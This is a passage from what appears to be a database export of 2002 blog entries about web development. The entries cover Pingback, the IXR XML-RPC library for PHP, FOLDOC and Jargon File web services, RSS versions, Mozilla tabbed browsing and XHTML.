&lt;p&gt;That said, I strongly believe that the Mozilla project should invest considerable effort in browser based editing tools. Web based interfaces are here to stay, and a lot of people spend large chunks of their day creating content in a browser. Rather than relying on wizzy and unstable javascript tricks though I think we should go back to basics and reconsider the textarea. Imagine a textarea element that, when double clicked, spawned a brand new editing environment in a new window with all of the tools of a modern text editor. Or how about the option to spawn Composer (Mozilla's built in HTML editor) with the contents of a textarea, then click a button to have your newly created HTML dumped right back there? I haven't looked at Composer properly so I have no idea how standards compliant it is (or isn't) but it's already built in to the Mozilla suite - why not integrate it with the one part of the browser that needs it the most?&lt;/p&gt;

&lt;p&gt;At the end of the day, I suppose anything that enables more people to publish to the web has to be a good thing - especially if it enables more people to make the switch from IE :)&lt;/p&gt;

&lt;p&gt;Incidentally, &lt;a href=&quot;http://ww.xopus.org/&quot;&gt;xopus.org&lt;/a&gt; have an interesting partial implementation of contentEditable for Mozilla. They have also just released the open source version of their impressive browser based XML editor. One to watch.&lt;/p&gt;</field>
		<field name="created">2002-09-04 16:56:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">384</field>
		<field name="title">Pingback specification</field>
		<field name="slug">pingBackSpec</field>
		<field name="body">&lt;p&gt;Stuart has published the &lt;a href=&quot;http://www.kryogenix.org/writings/tech/pingback&quot;&gt;first draught&lt;/a&gt; of the PingBack specification, detailing how PingBack works and how it should be implemented. PingBack is brilliant - it &lt;em&gt;just works&lt;/em&gt;. What could be simpler than just quietly telling someone's blog that you've linked to them?&lt;/p&gt;</field>
		<field name="created">2002-09-04 17:05:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">385</field>
		<field name="title">New version of IXR</field>
		<field name="slug">newVersionOfIXR</field>
		<field name="body">&lt;p&gt;Announcing beta 1.5 of IXR, the &lt;a href=&quot;http://scripts.incutio.com/xmlrpc/&quot;&gt;Incutio XML-PRC Library for PHP&lt;/a&gt;. The library has undergone a complete restructuring and has a much cleaner design as a result. It also has a huge stack of new features, including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Built in support for &lt;a href=&quot;http://groups.yahoo.com/group/xml-rpc/message/2897&quot;&gt;system.getCapabilities&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Built in support for system.listMethods&lt;/li&gt;
&lt;li&gt;system.methodSignature and system.methodHelp are supported in an extension class&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.xmlrpc.com/discuss/msgReader$1208&quot;&gt;system.multicall&lt;/a&gt; is implemented in both the server and extended client classes&lt;/li&gt;
&lt;li&gt;Follows the &lt;a href=&quot;http://xmlrpc-epi.sourceforge.net/specs/rfc.fault_codes.php&quot;&gt;Specification for Fault Code Interoperability&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://scripts.incutio.com/xmlrpc/manual.php&quot;&gt;Documentation&lt;/a&gt; - lots of it!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Enjoy! Feedback and bug reports to &lt;a href=&quot;/~cs1spw/blog/contact/&quot;&gt;the usual place&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-09-04 20:52:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">386</field>
		<field name="title">Two new web services</field>
		<field name="slug">twoNewWebServices</field>
		<field name="body">&lt;p&gt;I've implemented two example web services to demonstrate the &lt;a href=&quot;http://scripts.incutio.com/xmlrpc/&quot;&gt;Incutio PHP XML-RPC library's&lt;/a&gt; capabilities. The services allow you to search and retrieve articles from &lt;acronym title=&quot;The Free On-line Dictionary of Computing&quot;&gt;FOLDOC&lt;/acronym&gt; and the Jargon File, two popular freely available online dictionaries.&lt;/p&gt;

&lt;h4&gt;The Jargon File&lt;/h4&gt;

&lt;p&gt;The Jargon File is &quot;a comprehensive compendium of hacker slang illuminating 
  many aspects of hackish tradition, folklore, and humor&quot;.&lt;/p&gt;
&lt;p&gt;It is currently edited by Eric Raymond, and can be found on 
the web at &lt;a href=&quot;http://www.tuxedo.org/~esr/jargon/&quot;&gt;http://www.tuxedo.org/~esr/jargon/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The web service interface to the Jargon File allows you to search the dictionary and retrieve entries from it.&lt;/p&gt;

&lt;pre&gt;
Server: scripts.incutio.com
Path:   /xmlrpc/services/jargonfile.php
Port:   80
&lt;/pre&gt;

&lt;p&gt;The following methods are available (in addition to the standard system methods):&lt;/p&gt;

&lt;dl&gt;
&lt;dt&gt;jargon.about&lt;/dt&gt;
&lt;dd&gt;Returns a string containing information about the Jargon File and the web service interface.&lt;/dd&gt;
&lt;dt&gt;jargon.search&lt;/dt&gt;
&lt;dd&gt;Accepts a string (the search term) and returns an array of shortnames for entries that contain the term.&lt;/dd&gt;
&lt;dt&gt;jargon.getEntryByShortname&lt;/dt&gt;
&lt;dd&gt;Accepts a string (the shortname), and returns a struct representing the entry with that shortname.&lt;/dd&gt;
&lt;dt&gt;jargon.getEntryByTitle&lt;/dt&gt;
&lt;dd&gt;Accepts a string (the title), and returns a struct representing the entry with that title.&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;I have written &lt;a href=&quot;http://scripts.incutio.com/xmlrpc/jargon-file-with-python.php&quot; title=&quot; Accessing The Jargon File using Python&amp;apos;s XMLRPClib&quot;&gt;a guide&lt;/a&gt; to accessing the Jargon File web service using Python's &lt;code&gt;xmlrpclib&lt;/code&gt;.&lt;/p&gt;

&lt;h4&gt;FOLDOC&lt;/h4&gt;

&lt;p&gt;FOLDOC is the Free Online Dictionary of Computing, edited by Denis Howe and made
available under the GNU Free Documentation License. It can be found on the web
at &lt;a href=&quot;http://www.foldoc.org/&quot;&gt;www.foldoc.org&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;
Server: scripts.incutio.com
Path:   /xmlrpc/foldoc/server.php
Port:   80
&lt;/pre&gt;

&lt;dl&gt;
&lt;dt&gt;foldoc.about&lt;/dt&gt;
&lt;dd&gt;Returns a string containing information about FOLDOC and the web service interface.&lt;/dd&gt;
&lt;dt&gt;foldoc.searchEntries&lt;/dt&gt;
&lt;dd&gt;Accepts a string (the search term) and returns an array of names of entries containing that term (up to a limit of 1000).&lt;/dd&gt;
&lt;dt&gt;foldoc.getEntry&lt;/dt&gt;
&lt;dd&gt;Accepts a string (the name of an entry) and returns a struct representing that entry.&lt;/dd&gt;
&lt;dt&gt;foldoc.listCategories&lt;/dt&gt;
&lt;dd&gt;Returns a struct with a list of all of the categories in the dictionary along with the number of entries in each category.&lt;/dd&gt;
&lt;dt&gt;foldoc.listEntriesInCategory&lt;/dt&gt;
&lt;dd&gt;Accepts a string (the category) and returns an array of entry titles that belong to the category.&lt;/dd&gt;
&lt;/dl&gt;</field>
		<field name="created">2002-09-05 13:58:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">387</field>
		<field name="title">Voostind on open source libraries</field>
		<field name="slug">voostindOnOpenSourceLibraries</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.sitepointforums.com/showthread.php?threadid=75177#post545614&quot;&gt;Vincent Oostind&lt;/a&gt;:&lt;/p&gt;&lt;blockquote cite=&quot;http://www.sitepointforums.com/showthread.php?threadid=75177#post545614&quot;&gt;&lt;p&gt;In most areas in computer science, Open Source products follow after the commercial ones. Admittedly, first some pioneer thinks of a new technology and often releases it as Open Source, but the released stuff is never quite fit for production use. That makes sense, because it was a prototype; it was being pioneered. If it looks promising, commercial companies take it over, throw lots of money and expertise at it, and end up with a product that does make it into the market. Once a large group of people wants the same thing that commercial software already provides, but they don't want to pay for it, then they try to mimic it.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Vincent also makes some interesting points about the relative difficulty of library and framework design compared to writing interpreters and compilers. Today's must-read.&lt;/p&gt;</field>
		<field name="created">2002-09-05 21:36:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">388</field>
		<field name="title">IXR forum</field>
		<field name="slug">ixrForum</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://scripts.incutio.com/&quot;&gt;Incutio XML-RPC Library for PHP&lt;/a&gt; (IXR to its friends) now has &lt;a href=&quot;http://forums.incutio.com/viewforum.php?forum=ixr&quot; title=&quot;IXR Forum&quot;&gt;a forum&lt;/a&gt;. The forum is powered by incForum, Incutio's very own forum software written by my colleague &lt;a href=&quot;http://www.tfountain.co.uk/&quot;&gt;Tim&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-09-05 23:57:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">389</field>
		<field name="title">geoIP</field>
		<field name="slug">geoIP</field>
		<field name="body">&lt;p&gt;Adrian Holovaty in a &lt;a href=&quot;http://www.aquarionics.com/misc/archives/blogite/0048.html&quot;&gt;blogite thread&lt;/a&gt; about features that can be added to blogs:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.aquarionics.com/misc/archives/blogite/0048.html&quot;&gt;&lt;p&gt;Change the time zone. I've noticed a lot of blogs don't specify which time
zone they're in, which pretty much makes the timestamp meaningless. I put
&quot;EST&quot; on mine, and my about page explains my time zone further, but I think
it would be convenient for the users to convert the times to their own
zones. I did this in JavaScript on one of my old sites, but I'd rather do it
on the server side for accessibility's sake.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;This got me thinking about how best to &quot;guess&quot; a user's timezone. A search on Google for &quot;country ip address&quot; turned up &lt;a href=&quot;http://www.maxmind.com/&quot;&gt;GeoIP&lt;/a&gt;, an impressive looking open-source based database for looking up countries by IP address. The database updated yearly is free, while monthly updates can be had for a very reasonable $150 annual subscription.&lt;/p&gt;</field>
		<field name="created">2002-09-06 00:44:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">390</field>
		<field name="title">Pingback test</field>
		<field name="slug">pingbackTest</field>
		<field name="body">&lt;p&gt;Aquarionics is now &lt;a href=&quot;http://www.aquarionics.com/index.php?id=695&quot;&gt;PingBack enabled&lt;/a&gt;, and he implemented it using &lt;a href=&quot;http://scripts.incutio.com/xmlrpc/&quot;&gt;IXR&lt;/a&gt;. &lt;em&gt;Yay!&lt;/em&gt;&lt;/p&gt;</field>
		<field name="created">2002-09-06 01:19:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">391</field>
		<field name="title">Leonard's Mozilla links</field>
		<field name="slug">leonardsMozillaLinks</field>
		<field name="body">&lt;p&gt;Leonard Lin has blogged &lt;a href=&quot;http://randomfoo.net/?p=2002_09_01_archive.inc#85420356&quot;&gt;a whole bunch of useful Mozilla links&lt;/a&gt;. He also has this to say about &lt;a href=&quot;http://optimoz.mozdev.org/gestures/&quot;&gt;mouse gestures&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://randomfoo.net/?p=2002_09_01_archive.inc#85420356&quot;&gt;&lt;p&gt;OK, some people like gestures. I don't because I like dragging my mouse around and highlighting stuff randomly.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;So do I - that's why I've got gestures configured to my right mouse button :) Judging by Leonard's blog he uses OS X on a Mac, which I'm guessing comes with a one button mouse. The gesture package allows you to set a modified key that must be held down to activate gestures but I can't see that this provides any real benefit over using a keyboard shortcut.&lt;/p&gt;</field>
		<field name="created">2002-09-06 11:23:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">392</field>
		<field name="title">Google cooking</field>
		<field name="slug">googleCooking</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://judy.hourihan.com/2002_09_01_archive.html#81162483&quot;&gt;Google cooking&lt;/a&gt; (via &lt;a href=&quot;http://www.kottke.org/02/09/020905googlecookin.html&quot;&gt;Kottke&lt;/a&gt;). This is going to be very useful when I get back to uni.&lt;/p&gt;</field>
		<field name="created">2002-09-06 19:21:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">393</field>
		<field name="title">Why Scott needs Mozilla</field>
		<field name="slug">whyScottNeedsMozilla</field>
		<field name="body">&lt;p&gt;Judging by &lt;a href=&quot;http://radio.weblogs.com/0103807/stories/2002/09/06/whenWindowsProfilesFailAndWhy.html&quot;&gt;the screenshot on this page&lt;/a&gt;, Scott &lt;em&gt;really&lt;/em&gt; needs Mozilla :) I'm currently running Windows XP on a Pentium II with 128 MB of RAM but thanks to Mozilla's tabbed browsing I have over 20 web pages open and my machine isn't breaking a sweat (and that's in addition to Eudora and mySQLFront). Best of all, my task bar stays nice and tidy as it only shows one instance of Mozilla. I know Scott's itching to switch already so I'll teasingly remind him that Mozilla can have multiple windows each with multiple tabs - so you can have a single window with a collection of sites for each item you are currently researching. More tabbed browsing advocacy from Dave Hyatt &lt;a href=&quot;http://www.mozillazine.org/weblogs/hyatt/2002_07_21_mozillian_archive.html#85289235&quot; title=&quot;It&amp;apos;s all about the tabs&quot;&gt;right here&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-09-06 20:00:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">394</field>
		<field name="title">Mark blogs RSS</field>
		<field name="slug">markBlogsRSS</field>
		<field name="body">&lt;p&gt;There's enough RSS discussion floating about right now to make one's head spin. Thank Goodness then for Mark Pilgrim, who yesterday posted an excellent &lt;a href=&quot;http://diveintomark.org/archives/2002/09/05.html#rss_20&quot;&gt;explanation of RSS 2.0&lt;/a&gt;, and today followed it up with both a hugely informative &lt;a href=&quot;http://diveintomark.org/archives/2002/09/06.html#history_of_the_rss_fork&quot;&gt;History of the RSS Fork&lt;/a&gt; and a &lt;a href=&quot;http://diveintomark.org/archives/2002/09/06.html#the_case_for_simplicity&quot; title=&quot;The Case for Simplicity&quot;&gt;concise summary&lt;/a&gt; of the cases for deprecating some of the existing RSS 0.94 elements in the upgrade to RSS 2.0, which seems to be one of the biggest talking points in the RSS community at the moment. I can't say I've quite figured RSS out yet but thanks to Mark's tireless commentary I fell a lot more informed than I was yesterday morning.&lt;/p&gt;</field>
		<field name="created">2002-09-06 20:07:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">395</field>
		<field name="title">Javascript Google highlighting</field>
		<field name="slug">javascriptGoogleHighlighting</field>
		<field name="body">&lt;p&gt;Stuart has outdone himself with his latest piece of javascript wizzardry. &lt;a href=&quot;http://www.kryogenix.org/code/browser/searchhi/&quot;&gt;searchhi&lt;/a&gt; will highlight search terms when someone visits your page from a link on Google - all using the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; and all without you having to do anything more than add a &amp;lt;script&amp;gt; element to the top of your page!&lt;/p&gt;</field>
		<field name="created">2002-09-07 14:05:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">396</field>
		<field name="title">Python RSS tutorials</field>
		<field name="slug">pythonRSSTutorials</field>
		<field name="body">&lt;p&gt;Spotted on &lt;a href=&quot;http://pythonowns.blogspot.com/2002_09_01_pythonowns_archive.html#81231933&quot; title=&quot;Effbot is building another RSS newsreader&quot;&gt;Python owns us&lt;/a&gt;: Fredrik Lundh is &lt;a href=&quot;http://online.effbot.org/2002_09_01_archive.htm#85418477&quot; title=&quot;yet another rss aggregator&quot;&gt;building an RSS newsreader&lt;/a&gt; in Python, and writing Python tutorials on the project as he goes along. The first tutorial, &lt;a href=&quot;http://effbot.org/zone/effnews-1.htm&quot;&gt;Fetching RSS Files&lt;/a&gt;, is available now and covers (in detail) retrieving RSS files over the web, including an excellent explanation of  asynchronous HTTP requests.&lt;/p&gt;</field>
		<field name="created">2002-09-07 14:11:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">397</field>
		<field name="title">Hehe RSS3</field>
		<field name="slug">heheRSS3</field>
		<field name="body">&lt;p&gt;Forget about RSS 0.9x, RSS 1.0 and RSS 2.0, Aaron Schwartz has &lt;a href=&quot;http://www.aaronsw.com/weblog/000574&quot;&gt;released a spec&lt;/a&gt; for RSS 3.0 :)&lt;/p&gt;&lt;blockquote cite=&quot;http://www.aaronsw.com/weblog/000574&quot;&gt;&lt;p&gt;There's been a lot of talk in the community about how RSS 2.0 is too complicated. I haven't heard any objections, so I'm going to move ahead with the following changes that will result in RSS 3.0.&lt;/p&gt;

&lt;p&gt;1. Remove XML. XML is just too complicated and is against the spirit of RSS, which is Really Simple Syndication. I don't want people to have to buy one of these 200 page XML books to understand RSS. And XML sucks up bandwidth like nobody's business. Instead, we'll go back to RFC822-style fields. There are lots of available parsers for those.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;-- snip --&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;3. HTML forbidden. No one needs HTML. Email has been just fine for years before Microsoft introduce their stupid rich HTML extensions. HTML is for those loser newbies. Any intelligent Internet user deals in plain text.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Best of all, it can be parsed using a &lt;a href=&quot;http://lists.w3.org/Archives/Public/www-archive/2002Sep/0089&quot;&gt;Python one-liner&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-09-07 14:34:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">398</field>
		<field name="title">Pingback server code</field>
		<field name="slug">pingbackServerCode</field>
		<field name="body">&lt;p&gt;The source code for my PingBack server, including the code I use to grab an extract from the page linking to my site, is now available &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/pingback/server.php.txt&quot; title=&quot;Source code for server.php&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-09-07 21:23:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">399</field>
		<field name="title">Solution to the timezone problem</field>
		<field name="slug">solutionToTheTimezoneProblem</field>
		<field name="body">&lt;p&gt;Hixie has &lt;a href=&quot;http://ln.hixie.ch/?start=1031384833&amp;amp;count=1&quot; title=&quot; Time zones in Web logs (+1 hour)&quot;&gt;a brilliant solution&lt;/a&gt; to the &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/09/06/#geoIP&quot;&gt;time zone problem&lt;/a&gt; in the form of a clever piece of &lt;acronym title=&quot;XML Binding Language&quot;&gt;XBL&lt;/acronym&gt; by Nicolás Lichtmier. The small script can be bound to an element containing a date in &lt;acronym title=&quot;Universal Time Coordinated&quot;&gt;UTC&lt;/acronym&gt; and will quietly replace it with the time in the user's current timezone using Mozilla's built in UTC handling functions. Naturally it only works in Mozilla, but I imagine the script could be emulated using Internet Explorer behaviors.&lt;/p&gt;</field>
		<field name="created">2002-09-07 21:32:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">400</field>
		<field name="title">Excellent RSS tutorial</field>
		<field name="slug">excellentRSSTutorial</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.mnot.net/rss/tutorial/&quot;&gt;RSS Tutorial for Content Publishers and Webmasters&lt;/a&gt; is a great read if you haven't figured out the difference between RSS 0.9x (Really Simple Syndication), RSS 1.0 (RDF Site Summary) and RDF (a web standard for meta data which is used within RSS).&lt;/p&gt;</field>
		<field name="created">2002-09-07 21:59:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">401</field>
		<field name="title">New Hosting</field>
		<field name="slug">newHosting</field>
		<field name="body">&lt;p&gt;If you were wondering why this blog went quiet all of a sudden, here's the reason. I've moved to a new host, and in the process completely rewritten the engine that powers this weblog from the ground up. Entries, comments and other bits and pieces are now served from a mySQL database as opposed to the flat files I was using before hand, and all pages are dynamically generated rather than being built as flat HTML files. The design remains pretty much the same, but comments and pingbacks are now displayed on the same page as blog entries rather than having their own popup windows. I am also no longer restricted by the previous hosting's bizzare limit on the size of POSTed form variables, leaving me free to write longer blog entries (and you free to write longer comments).&lt;/p&gt;</field>
		<field name="created">2002-09-09 23:36:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">402</field>
		<field name="title">Hixie on XHTML</field>
		<field name="slug">hixieOnXHTML</field>
		<field name="body">&lt;p&gt;Ian Hickson: &lt;a href=&quot;http://www.hixie.ch/advocacy/xhtml&quot;&gt;Sending XHTML as text/html Considered Harmful&lt;/a&gt;. Ian makes an excellent case for sticking with HTML 4.01 rather than upgrading to XHTML. Here's the killer point (at least for me):&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Document sent as text/html are handled as tag soup [1] by most UAs.
This means that authors are not checking for validity, and thus
most XHTML documents on the web now are invalid. Therefore the main
advantage of using XHTML, that it has to be valid, is lost of the
document is then sent as text/html.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;XHTML documents that are not well-formed XML are useless, and since browsers still display them the web is potentially being polluted with invalid (and useless) XHTML documents. Ian also makes the point that, while the greatest benefit of XHTML is that it can be processed by XML parsers, the only people likely to take advantage of this ability are the content authors themselves who will most likely be using configurable tools to produce the content anyway.&lt;/p&gt;

&lt;p&gt;So why haven't I switched this blog back to HTML 4.01 yet? It's a good question, and one which I will attempt to answer in the not too distant future.&lt;/p&gt;</field>
		<field name="created">2002-09-10 14:30:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">403</field>
		<field name="title">Thrown the switch</field>
		<field name="slug">thrownTheSwitch</field>
		<field name="body">&lt;p&gt;I've flicked the switch and redirected my old blog to this new site. Unfortunately the Bath University web server appears not to obey &lt;code&gt;.htaccess&lt;/code&gt; directives so I am currently having trouble redirecting old archive pages to their new homes on this site. I should have that issue fixed shortly, but in the meantime permalinks to pages on my old site will throw an unsightly 404 error page.&lt;/p&gt;</field>
		<field name="created">2002-09-10 14:54:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">404</field>
		<field name="title">Pocket Stuff</field>
		<field name="slug">pockets</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://weblog.delacour.net/archives/000683.html&quot; title=&quot;Pocket stuff: it&amp;apos;s a guy thing&quot;&gt;Jonathan Delacour&lt;/a&gt;:&lt;/p&gt;&lt;blockquote cite=&quot;http://weblog.delacour.net/archives/000683.html&quot;&gt;&lt;p&gt;Big Kev is an Australian icon who has taken the cleaning products business by storm—partly because of the quality of his merchandise but mainly because he appears in his own TV commercials wearing one of a large collection of spectacularly vulgar satin shirts and signing off with the slogan: I'm Excited! Thanks to Big Kev, Australia leads the world in stain removal technology.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Jonathan's right, &quot;pocket stuff&quot; &lt;em&gt;is&lt;/em&gt; a perfectly valid excuse (at least until society stops discriminating against guys with handbags).&lt;/p&gt;</field>
		<field name="created">2002-09-10 15:20:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">405</field>
		<field name="title">Labels.js</field>
		<field name="slug">labels</field>
		<field name="body">&lt;p&gt;Spotted on youngpup: &lt;a href=&quot;http://youngpup.net/?request=/articles/labels.xml&quot;&gt;Labels.js: A Re-Introduction to DHTML&lt;/a&gt; (from December 2001).&lt;/p&gt;
&lt;blockquote cite=&quot;http://youngpup.net/?request=/articles/labels.xml&quot;&gt;&lt;p&gt;Although simple, Labels.js is an example of my ideal DHTML script, and an example of what I believe the W3C had in mind for the DOM. Some of the design goals that it meets are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Completely modular design. Labels.js uses event listeners exclusively to avoid interference with any other scripts or functionality. It does not require any special &quot;initialization&quot;, and it does not modify it's environment.&lt;/li&gt;
&lt;li&gt;Unitializes itself before page unload so that a label will never be submitted as the value of a form field to a server process. This is consistent with the idea of complete modularity.&lt;/li&gt;
&lt;li&gt;Built on the DOM. Instead of using it's own complex custom object heirarchies, Labels.js is essentially glue code stringing together the existing functionality in the DOM.&lt;/li&gt;
&lt;li&gt;Does not require any extra presentational or behavioral information beyond what is present in the underlying XHTML.&lt;/li&gt;
&lt;li&gt;Degrades beautifully to it's structural components: a label and a textbox.&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;&lt;p&gt;The same elegant approach to DHTML can be seen in Stuart's &lt;a href=&quot;http://www.kryogenix.org/code/browser/aqtree2/&quot;&gt;aqTree&lt;/a&gt; javascript tree system.&lt;/p&gt;</field>
		<field name="created">2002-09-10 15:25:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">406</field>
		<field name="title">Composite for Mozilla</field>
		<field name="slug">compositeForMozilla</field>
		<field name="body">&lt;p&gt;A few days ago, I &lt;a href=&quot;http://simon.incutio.com/archive/2002/09/04/#browserBasedRichTextEditing&quot; title=&quot;Archive for 4th September, 2002&quot;&gt;blogged&lt;/a&gt; the following:&lt;/p&gt;&lt;blockquote cite=&quot;http://simon.incutio.com/archive/2002/09/04/#browserBasedRichTextEditing&quot;&gt;&lt;p&gt;Imagine a textarea element that, when double clicked, spawned a brand new editing environment in a new window with all of the tools of a modern text editor. Or how about the option to spawn Composer (Mozilla's built in HTML editor) with the contents of a textarea, then click a button to have your newly created HTML dumped right back there?&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;With the release of &lt;a href=&quot;http://composite.mozdev.org/&quot;&gt;Composite&lt;/a&gt;, it seems my wish has been fulfilled. Composite is &lt;q cite=&quot;http://composite.mozdev.org/&quot;&gt;a chrome overlay which enables a streamlined Mozilla Editor for html composition in textareas&lt;/q&gt;. Install the plugin, hit Ctrl+E in a textarea and off you go.&lt;/p&gt;

&lt;p&gt;It's still got a long way to go but for a first release it's looking very promising indeed.&lt;/p&gt;</field>
		<field name="created">2002-09-10 18:13:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">407</field>
		<field name="title">Pingback supported again</field>
		<field name="slug">pingbackSupportedAgain</field>
		<field name="body">&lt;p&gt;I've re-enabled PingBack on my blog. Auto-discovery is now supported via both the standard &amp;lt;link&amp;gt; element and the new X-PingBack &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; header. I have also implemented a new experimental method on my PingBack server - &lt;code&gt;pingback.extensions.getPingbacks(url)&lt;/code&gt;. Send it the URL for an entry on this blog (it must be an archive page and must include the fragment identifier so the system knows which entry you mean) and it will return an array of pages that have been registered as linking to that page via PingBack. This new feature is explained in detail in &lt;a href=&quot;http://www.aquarionics.com/misc/archives/blogite/0198.html&quot; title=&quot;[blogite] PingBack Syndication&quot;&gt;this email&lt;/a&gt; sent to the the &lt;a href=&quot;http://www.aquarionics.com/misc/blogite/&quot;&gt;blogite mailing list&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-09-13 17:58:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">408</field>
		<field name="title">Pingback spec</field>
		<field name="slug">pingbackSpec</field>
		<field name="body">&lt;p&gt;I just realised I haven't linked to the &lt;a href=&quot;http://www.hixie.ch/specs/pingback/pingback&quot;&gt;Pingback specification&lt;/a&gt; yet, so here it is. The spec has been carefully assembled by Ian Hickson and, although it is still a working draught, should be the first stop for anyone who wishes to create a Pingback implementation.&lt;/p&gt;</field>
		<field name="created">2002-09-10 20:44:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">409</field>
		<field name="title">Testing Pingback client</field>
		<field name="slug">testingPingbackClient</field>
		<field name="body">&lt;p&gt;This post exists partly to list the blogs I know of that support PingBack, but mostly to help test my new PingBack client implementation.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://ln.hixie.ch/?start=1031465247&amp;amp;count=1&quot;&gt;Hixie welcomes feedback&lt;/a&gt; on his text/html document.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.aquarionics.com/index.php?id=700&quot;&gt;Aquarion links to the above.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.kryogenix.org/days/000257.cas&quot;&gt;Stuart is having problems&lt;/a&gt; getting Mozilla gestures to work on Linux.&lt;/li&gt;

&lt;li&gt;&lt;a href=&quot;http://mort.mine.nu:8080/b2/index.php?m=200209#80220626&quot;&gt;Mort&lt;/a&gt; has a b2 PingBack client.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://tidakada.com/archives/m/200209#testing_pingback&quot;&gt;Michel&lt;/a&gt; tries it out.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Fingers crossed... here goes!&lt;/p&gt;</field>
		<field name="created">2002-09-11 01:17:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">410</field>
		<field name="title">RSS feeds coming soon</field>
		<field name="slug">rssFeedsComingSoon</field>
		<field name="body">&lt;p&gt;A quick note concerning &lt;acronym title=&quot;It could stand for pretty much anything these days&quot;&gt;RSS&lt;/acronym&gt; feeds. I have not yet implemented them on my new blog, but I plan to do so in the next few days. On the advice of &lt;a href=&quot;http://groups.yahoo.com/group/rss-dev/message/3641&quot;&gt;Chris Coome&lt;/a&gt; and &lt;a href=&quot;http://groups.yahoo.com/group/rss-dev/message/3642&quot;&gt;Bill Kearney&lt;/a&gt; (both of whom replied to &lt;a href=&quot;http://groups.yahoo.com/group/rss-dev/message/3639&quot;&gt;my question&lt;/a&gt; on [rss-dev]) I will be providing feeds in both RSS 1.0 and RSS 0.91 formats, and I plan to provide individual feeds for the various &lt;a href=&quot;/categories/&quot;&gt;categories&lt;/a&gt; on the site. I also have an idea for a feature that will allow people to &quot;build their own&quot; RSS feed consisting of the categories they are most interested in. As always, watch this space :)&lt;/p&gt;</field>
		<field name="created">2002-09-11 01:29:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">411</field>
		<field name="title">Disable CSS bookmarklet</field>
		<field name="slug">disableCSSBookmarklet</field>
		<field name="body">&lt;p&gt;A handy bookmarklet &lt;a href=&quot;http://groups.yahoo.com/group/MACCAWS/message/1047&quot;&gt;courtesy of Rick&lt;/a&gt; on the MACCAWS mailing list:&lt;/p&gt;

